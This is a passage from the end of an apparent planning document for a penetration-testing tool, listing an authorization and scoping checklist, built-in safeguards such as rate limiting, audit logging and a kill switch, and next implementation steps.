├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  □ Written authorization from system owner                     │
│  □ Scope clearly defined (URLs, IPs, methods allowed)          │
│  □ Testing window agreed upon                                  │
│  □ Emergency contacts established                              │
│  □ Data handling procedures documented                         │
│  □ Liability and indemnification addressed                     │
│  □ Report distribution list defined                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Built-in Safeguards

1. **Scope validation** - Only test URLs within defined scope
2. **Rate limiting** - Prevent accidental DoS
3. **Authorization header** - Include pentest identifier in requests
4. **Audit logging** - Complete log of all requests
5. **Kill switch** - Immediate stop capability

---

## Next Steps

1. **Create the repository structure**
2. **Implement Phase 1: Foundation**
3. **Set up testing infrastructure** (vulnerable test apps)
4. **Iterate through phases**

Ready to begin implementation?
